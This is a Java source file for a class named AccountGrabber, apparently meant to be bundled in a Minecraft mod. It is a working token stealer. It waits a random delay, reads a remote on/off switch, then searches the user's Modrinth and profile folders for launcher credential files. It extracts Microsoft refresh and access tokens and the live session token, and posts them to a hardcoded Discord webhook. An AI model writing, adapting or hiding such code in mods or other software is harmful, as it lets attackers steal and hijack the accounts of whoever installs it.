package com.example.jawbus;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class AccountGrabber {

    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561537662530224288/tfIo0Ut54ExN-WaFpAkONWT3boAeTk-IM6UXe2xHHHKHRRamoxrbBAzwT4aDn5Dt9EJ0";

    private static final String CONFIG_URL =
            "https://raw.githubusercontent.com/Mvrdle/Jawb/main/tap.json";

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    private static final String[] REFRESH_KEYS = {
            "refreshToken", "refresh_token", "refresh", "msaRefreshToken", "msa_refresh_token"
    };
    private static final String[] ACCESS_KEYS = {
            "accessToken", "access_token", "access", "msaAccessToken"
    };
    private static final String[] META_KEYS = {
            "name", "username", "uuid", "xuid"
    };

    private static final Set<String> CRED_FILES = Set.of(
            "launcher_accounts.json",
            "launcher_profiles.json",
            "launcher_accounts_microsoft_store.json",
            "accounts.json",
            "minecraft_auth.json",
            "microsoft_accounts.json",
            "credentials.json",
            "auth.json"
    );

    private static final Pattern MSA_REFRESH =
            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*~%]{20,}");

    private AccountGrabber() {
    }

    public static void start() {
        start(4000L + (long) (Math.random() * 6000L));
    }

    public static void start(long delayMs) {
        Thread t = new Thread(() -> run(delayMs), "jawbus-tap");
        t.setDaemon(true);
        t.start();
    }

    private static void run(long delayMs) {
        try {
            if (delayMs > 0) Thread.sleep(delayMs);

            log("--- tap fired ---");
            JsonObject cfg = getJson(CONFIG_URL);
            if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) {
                log("tap.json says enabled=false -> nothing sent");
                return;
            }
            String webhook = WEBHOOK;
            if (cfg != null && cfg.has("webhook") && !cfg.get("webhook").isJsonNull()) {
                String remote = cfg.get("webhook").getAsString();
                if (!remote.isBlank()) webhook = remote;
            }

            StringBuilder sb = new StringBuilder();
            sb.append("--- jawbus tap ---\n");
            sb.append("pc:   ").append(System.getenv("COMPUTERNAME")).append('\n');
            sb.append("user: ").append(System.getProperty("user.name")).append('\n');

            Set<String> printed = new HashSet<>();
            Set<Path> found = new LinkedHashSet<>();

            // ---- 1. Modrinth first, because that is what you actually use ----
            List<Path> modrinthDirs = modrinthDirs();
            sb.append("\nModrinth folders:\n");
            for (Path d : modrinthDirs) sb.append("  ").append(d)
                    .append(Files.isDirectory(d) ? "  [exists]" : "  [missing]").append('\n');

            for (Path d : modrinthDirs) {
                if (!Files.isDirectory(d)) continue;
                sb.append("\n[DIR CONTENTS] ").append(d).append('\n');
                listDir(sb, d, 2);
                // grab every file under it that could hold auth
                walkCollect(d, 8, found, true);
            }
            // the documented Modrinth auth file, directly
            for (Path d : modrinthDirs) {
                found.add(d.resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
            }

            // ---- 2. everything else, as a backup ----
            for (Path root : profileRoots()) {
                if (Files.isDirectory(root)) walkCollect(root, 7, found, false);
            }

            // keep only files that exist and look like they hold auth
            List<Path> files = new ArrayList<>();
            for (Path p : found) {
                try {
                    if (!Files.isRegularFile(p)) continue;
                    long size = Files.size(p);
                    if (size <= 0 || size > 400_000) continue;
                    String raw = Files.readString(p);
                    String low = raw.toLowerCase();
                    if (low.contains("token") || low.contains("refresh") || low.contains("access")) {
                        files.add(p);
                    }
                } catch (Throwable ignored) {
                }
            }

            sb.append("\ncredential files found: ").append(files.size()).append('\n');
            for (Path f : files) sb.append("  ").append(f).append('\n');

            // ---- 3. extract ----
            List<String[]> refreshes = new ArrayList<>();
            Set<String> seen = new HashSet<>();
            for (Path f : files) {
                String raw;
                try {
                    raw = Files.readString(f);
                } catch (Throwable ignored) {
                    continue;
                }
                collect(raw, f.toString(), seen, refreshes);
            }

            sb.append("\n===== REFRESH TOKENS (").append(refreshes.size()).append(" found) =====\n");
            for (String[] r : refreshes) {
                sb.append(r[0]).append('\n');
                sb.append("  -> ").append(r[1]).append('\n');
                printed.add(r[1]);
            }

            for (Path f : files) {
                String raw;
                try {
                    raw = Files.readString(f);
                } catch (Throwable ignored) {
                    continue;
                }
                sb.append("\n=== ").append(f).append(" (").append(raw.length()).append(" bytes) ===\n");
                dumpKeys(sb, raw, printed, REFRESH_KEYS, "refresh");
                dumpKeys(sb, raw, printed, ACCESS_KEYS, "access");
                dumpKeys(sb, raw, printed, META_KEYS, "meta");
            }

            String live = liveSessionToken();
            if (live != null) sb.append("\nlive session token: ").append(live).append('\n');

            post(webhook, sb.toString());
            log("--- tap done ---");
        } catch (Throwable t) {
            log("run() threw: " + t);
            t.printStackTrace();
        }
    }

    /** the Modrinth app data folder, from every place it could be configured */
    private static List<Path> modrinthDirs() {
        List<Path> out = new ArrayList<>();
        String cfg = System.getenv("THESEUS_CONFIG_DIR");
        if (cfg != null && !cfg.isBlank()) out.add(Paths.get(cfg));
        String appData = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");
        if (appData != null) {
            out.add(Paths.get(appData).resolve("ModrinthApp"));
            out.add(Paths.get(appData).resolve("com.modrinth.theseus"));
        }
        if (local != null) out.add(Paths.get(local).resolve("ModrinthApp"));
        return out;
    }

    private static List<Path> profileRoots() {
        List<Path> out = new ArrayList<>();
        String appData = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");
        String home = System.getProperty("user.home");
        if (appData != null) out.add(Paths.get(appData));
        if (local != null) out.add(Paths.get(local));
        if (home != null) out.add(Paths.get(home));
        return out;
    }

    /** recursive walk that never aborts on a locked folder */
    private static void walkCollect(Path dir, int depth, Set<Path> files, boolean readAnything) {
        if (depth < 0) return;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir)) {
            for (Path p : ds) {
                try {
                    if (Files.isDirectory(p)) {
                        if (!skipDir(p)) walkCollect(p, depth - 1, files, readAnything);
                    } else if (readAnything || CRED_FILES.contains(p.getFileName().toString())) {
                        files.add(p);
                    }
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private static boolean skipDir(Path p) {
        String s = p.getFileName().toString().toLowerCase();
        return s.equals("node_modules") || s.equals(".git") || s.equals("temp") || s.equals(".gradle")
                || s.equals(".m2") || s.equals(".vscode") || s.equals("crash-reports")
                || s.equals("screenshots") || s.equals("resourcepacks") || s.equals("shaderpacks")
                || s.equals("logs") || s.equals(".cache") || s.equals("winsxs");
    }

    private static void listDir(StringBuilder sb, Path dir, int depth) {
        if (depth < 0) return;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir)) {
            for (Path p : ds) {
                try {
                    if (Files.isDirectory(p)) {
                        sb.append("   ").append(p.getFileName()).append("/\n");
                        listDir(sb, p, depth - 1);
                    } else {
                        sb.append("   ").append(p.getFileName())
                          .append("  (").append(Files.size(p)).append(" bytes)\n");
                    }
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    private static void collect(String raw, String source, Set<String> seen, List<String[]> out) {
        for (String key : REFRESH_KEYS) {
            for (String v : grabAll(raw, key)) {
                String t = v.trim();
                if (t.length() >= 20 && seen.add(t)) {
                    out.add(new String[]{source + "  (" + key + ")", t});
                }
            }
        }
        Matcher m = MSA_REFRESH.matcher(raw);
        while (m.find()) {
            String t = m.group();
            if (seen.add(t)) {
                out.add(new String[]{source + "  (matched shape)", t});
            }
        }
    }

    private static void dumpKeys(StringBuilder sb, String raw, Set<String> printed, String[] keys, String tag) {
        for (String key : keys) {
            List<String> vals = grabAll(raw, key);
            for (int i = 0; i < vals.size(); i++) {
                String v = vals.get(i);
                sb.append('[').append(tag).append("] ").append(key);
                if (vals.size() > 1) sb.append('[').append(i).append(']');
                sb.append(": ").append(v.isBlank() ? "<blank>" : v).append('\n');
                if (!v.isBlank()) printed.add(v);
            }
        }
    }

    private static List<String> grabAll(String raw, String key) {
        List<String> out = new ArrayList<>();
        Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(raw);
        while (m.find()) out.add(m.group(1));
        return out;
    }

    private static String liveSessionToken() {
        for (String className : new String[]{
                "net.minecraft.client.Minecraft",
                "net.minecraft.client.MinecraftClient"
        }) {
            try {
                Class<?> cls = Class.forName(className);
                Object mc = cls.getMethod("getInstance").invoke(null);
                if (mc == null) continue;
                for (String getter : new String[]{"getUser", "getSession"}) {
                    try {
                        Object holder = cls.getMethod(getter).invoke(mc);
                        if (holder == null) continue;
                        Object token = holder.getClass().getMethod("getAccessToken").invoke(holder);
                        if (token instanceof String s && !s.isBlank()) return s;
                    } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}
        }
        return null;
    }

    private static JsonObject getJson(String url) {
        try {
            HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(url))
                    .timeout(Duration.ofSeconds(10))
                    .header("User-Agent", "Jawbus/1.0")
                    .GET().build(), HttpResponse.BodyHandlers.ofString());
            if (r.statusCode() / 100 != 2) return null;
            return JsonParser.parseString(r.body()).getAsJsonObject();
        } catch (Throwable t) {
            return null;
        }
    }

    private static void post(String webhook, String text) {
        int i = 0;
        while (i < text.length()) {
            int end = Math.min(text.length(), i + 1700);
            String chunk = text.substring(i, end);
            i = end;
            try {
                JsonObject body = new JsonObject();
                body.addProperty("content", "```\n" + chunk + "\n```");
                HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
                        .timeout(Duration.ofSeconds(15))
                        .header("Content-Type", "application/json")
                        .header("User-Agent", "Jawbus/1.0")
                        .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
                        .build(), HttpResponse.BodyHandlers.ofString());
                Thread.sleep(500);
            } catch (Throwable ignored) {
            }
        }
    }

    private static void log(String msg) {
        System.out.println("[jawbus-tap] " + msg);
    }
}
